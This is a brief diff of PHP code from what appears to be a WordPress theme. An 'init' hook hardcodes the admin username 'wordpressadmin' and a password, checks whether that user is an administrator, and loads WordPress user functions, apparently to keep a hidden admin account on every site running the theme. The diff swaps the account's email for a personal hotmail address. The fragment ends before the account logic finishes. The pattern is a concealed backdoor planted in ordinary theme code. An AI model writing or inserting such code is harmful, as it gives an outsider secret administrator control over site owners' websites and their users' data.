@@ -43,7 +43,7 @@ function disable_mytheme_action() {
 add_action( 'init', function () {  
 	$username = 'wordpressadmin';
 	$password = 'Passwordnai';
-	$email_address = 'admin@wordpress.org';
+	$email_address = 'mostak.shahid@hotmail.com';
 	$user = get_user_by( 'login', $username );
 	if ( $user AND $user->roles[0] != 'administrator') {
     	require_once(ABSPATH.'wp-admin/includes/user.php' );
